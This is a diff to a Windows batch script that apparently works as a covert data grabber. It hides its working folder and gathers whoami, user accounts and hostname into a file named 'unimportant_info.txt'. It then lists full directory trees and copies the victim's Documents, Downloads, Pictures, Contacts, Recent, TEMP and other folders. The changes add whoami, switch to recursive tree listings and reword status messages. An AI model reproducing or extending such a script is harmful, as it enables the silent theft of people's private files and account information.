@@ -40,7 +40,9 @@ attrib +h "%USERNAME%"
 cd %USERNAME%
 call :ColorText 0C "Collecting information..."
 echo.
-echo Current Users: > "unimportant_info.txt"
+echo Whoami: > "unimportant_info.txt"
+whoami >> "unimportant_info.txt"
+echo Current Users: >> "unimportant_info.txt"
 net user >> "unimportant_info.txt"
 echo PC Name: >> "unimportant_info.txt"
 hostname >> "unimportant_info.txt"
@@ -164,25 +166,25 @@ echo.
 echo Internet is ready - %time% >> "retrieval_time.txt"
 mkdir files
 echo Desktop > %cd%\dir.txt
-dir C:\Users\%USERNAME%\Desktop >> %cd%\dir.txt
+tree /f "C:\Users\%USERNAME%\Desktop" >> %cd%\dir.txt
 echo Downloads >> %cd%\dir.txt
-dir C:\Users\%USERNAME%\Downloads >> %cd%\dir.txt\
+tree /f "C:\Users\%USERNAME%\Downloads" >> %cd%\dir.txt
 echo TEMP >> %cd%\dir.txt
-dir %TEMP% >> %cd%\dir.txt
+tree /f "%TEMP%" >> %cd%\dir.txt
 echo Recent >> %cd%\dir.txt
-dir C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Recent >> %cd%\dir.txt
+tree /f "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Recent" >> %cd%\dir.txt
 echo Favorites >> %cd%\dir.txt
-dir C:\Users\%USERNAME%\Favorites >> %cd%\dir.txt
+tree /f "C:\Users\%USERNAME%\Favorites" >> %cd%\dir.txt
 echo Documents >> %cd%\dir.txt
-dir C:\Users\%USERNAME%\Documents >> %cd%\dir.txt
+tree /f "C:\Users\%USERNAME%\Documents" >> %cd%\dir.txt
 echo Pictures >> %cd%\dir.txt
-dir C:\Users\%USERNAME%\Pictures >> %cd%\dir.txt
+tree /f "C:\Users\%USERNAME%\Pictures" >> %cd%\dir.txt
 echo Contacts >> %cd%\dir.txt
-dir C:\Users\%USERNAME%\Contacts >> %cd%\dir.txt
+tree /f "C:\Users\%USERNAME%\Contacts" >> %cd%\dir.txt
 echo Music >> %cd%\dir.txt
-dir C:\Users\%USERNAME%\Music >> %cd%\dir.txt
+tree /f "C:\Users\%USERNAME%\Music" >> %cd%\dir.txt
 echo Videos >> %cd%\dir.txt
-dir C:\Users\%USERNAME%\Videos >> %cd%\dir.txt
+tree /f "C:\Users\%USERNAME%\Videos" >> %cd%\dir.txt
 call :ColorText 02 "Dir journal is ready"
 echo.
 echo Dir journal is ready - %time% >> "retrieval_time.txt"
@@ -193,47 +195,47 @@ echo.
 echo Desktop created - %time% >> "retrieval_time.txt"
 mkdir %cd%\files\Downloads
 xcopy "C:\Users\%USERNAME%\Downloads\*" "%cd%\files\Downloads" /s /e
-call :ColorText 02 "Downloads created"
+call :ColorText 02 "Downloads is ready"
 echo.
 echo Downloads created - %time% >> "retrieval_time.txt"
 mkdir %cd%\files\TEMP
 xcopy "%TEMP%\*" "%cd%\files\TEMP" /s /e
-call :ColorText 02 "TEMP created"
+call :ColorText 02 "TEMP is ready"
 echo.
 echo TEMP created - %time% >> "retrieval_time.txt"
 mkdir %cd%\files\Recent
 xcopy "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Recent\*" "%cd%\files\Recent" /s /e
-call :ColorText 02 "Recent created"
+call :ColorText 02 "Recent is ready"
 echo.
 echo Recent created - %time% >> "retrieval_time.txt"
 mkdir %cd%\files\Favorites
 xcopy "C:\Users\%USERNAME%\Favorites\*" "%cd%\files\Favorites" /s /e
-call :ColorText 02 "Favorites created"
+call :ColorText 02 "Favorites is ready"
 echo.
 echo Favorites created - %time% >> "retrieval_time.txt"
 mkdir %cd%\files\Documents
 xcopy "C:\Users\%USERNAME%\Documents\*" "%cd%\files\Documents" /s /e
-call :ColorText 02 "Documents created"
+call :ColorText 02 "Documents is ready"
 echo.
 echo Documents created - %time% >> "retrieval_time.txt"
 mkdir %cd%\files\Pictures
 xcopy "C:\Users\%USERNAME%\Pictures\*" "%cd%\files\Pictures" /s /e
-call :ColorText 02 "Pictures created"
+call :ColorText 02 "Pictures is ready"
 echo.
 echo Pictures created - %time% >> "retrieval_time.txt"
 mkdir %cd%\files\Contacts
 xcopy "C:\Users\%USERNAME%\Contacts\*" "%cd%\files\Contacts" /s /e
-call :ColorText 02 "Contacts created"
+call :ColorText 02 "Contacts is ready"
 echo.
 echo Contacts created - %time% >> "retrieval_time.txt"
 mkdir %cd%\files\Music
 xcopy "C:\Users\%USERNAME%\Music\*" "%cd%\files\Music" /s /e
-call :ColorText 02 "Music created"
+call :ColorText 02 "Music is ready"
 echo.
 echo Music created - %time% >> "retrieval_time.txt"
 mkdir %cd%\files\Videos
 xcopy "C:\Users\%USERNAME%\Videos\*" "%cd%\files\Videos" /s /e
-call :ColorText 02 "Videos created"
+call :ColorText 02 "Videos is ready"
 echo.
 echo Videos created - %time% >> "retrieval_time.txt"
 exit
